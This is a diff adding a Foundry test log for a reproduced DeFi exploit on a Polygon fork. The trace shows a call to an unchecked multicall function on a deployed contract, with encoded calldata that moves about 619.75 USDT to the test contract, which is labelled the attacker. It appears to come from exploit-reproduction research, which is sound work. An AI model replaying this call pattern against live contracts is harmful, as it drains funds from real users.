@@ -1,0 +1,38 @@
+No files changed, compilation skipped
+
+Ran 1 test for test/MulticallWithoutCheck_exp.sol:ContractTest
+[PASS] testExploit() (gas: 53168)
+Logs:
+  [End] Attacker USDT balance after exploit: 619.748460
+
+Traces:
+  [5795] ContractTest::setUp()
+    ├─ [0] VM::createSelectFork("polygon", 34743770 [3.474e7])
+    │   └─ ← [Return] 0
+    └─ ← [Stop]
+
+  [57968] ContractTest::testExploit()
+    ├─ [7962] 0xc2132D05D31c914a87C6611C10748AEb04B58e8F::balanceOf(0x940cE652A51EBadB5dF09d605dBEDA95fDcF697b) [staticcall]
+    │   ├─ [2608] 0x7FFB3d637014488b63fb9858E279385685AFc1e2::balanceOf(0x940cE652A51EBadB5dF09d605dBEDA95fDcF697b) [delegatecall]
+    │   │   └─ ← [Return] 619748460 [6.197e8]
+    │   └─ ← [Return] 619748460 [6.197e8]
+    ├─ [31516] 0x940cE652A51EBadB5dF09d605dBEDA95fDcF697b::multicallWithoutCheck([Call({ target: 0xc2132D05D31c914a87C6611C10748AEb04B58e8F, callData: 0xa9059cbb0000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000000000000000000000000000000000024f09c6c, value: 0 })])
+    │   ├─ [29198] 0xc2132D05D31c914a87C6611C10748AEb04B58e8F::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 619748460 [6.197e8])
+    │   │   ├─ [28338] 0x7FFB3d637014488b63fb9858E279385685AFc1e2::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 619748460 [6.197e8]) [delegatecall]
+    │   │   │   ├─ emit Transfer(from: 0x940cE652A51EBadB5dF09d605dBEDA95fDcF697b, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 619748460 [6.197e8])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x22a8c507e1f04162f7488b38a1fe5f78471a323512239ade4da4ab88bdb94793: 0x0000000000000000000000000000000000000000000000000000000024f09c6c → 0
+    │   │   │   │   @ 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03: 0 → 0x0000000000000000000000000000000000000000000000000000000024f09c6c
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Return] true
+    │   └─ ← [Stop]
+    ├─ [1462] 0xc2132D05D31c914a87C6611C10748AEb04B58e8F::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   ├─ [608] 0x7FFB3d637014488b63fb9858E279385685AFc1e2::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
+    │   │   └─ ← [Return] 619748460 [6.197e8]
+    │   └─ ← [Return] 619748460 [6.197e8]
+    ├─ emit log_named_decimal_uint(key: "[End] Attacker USDT balance after exploit", val: 619748460 [6.197e8], decimals: 6)
+    └─ ← [Stop]
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 3.30s (1.88s CPU time)
+
+Ran 1 test suite in 4.52s (3.30s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
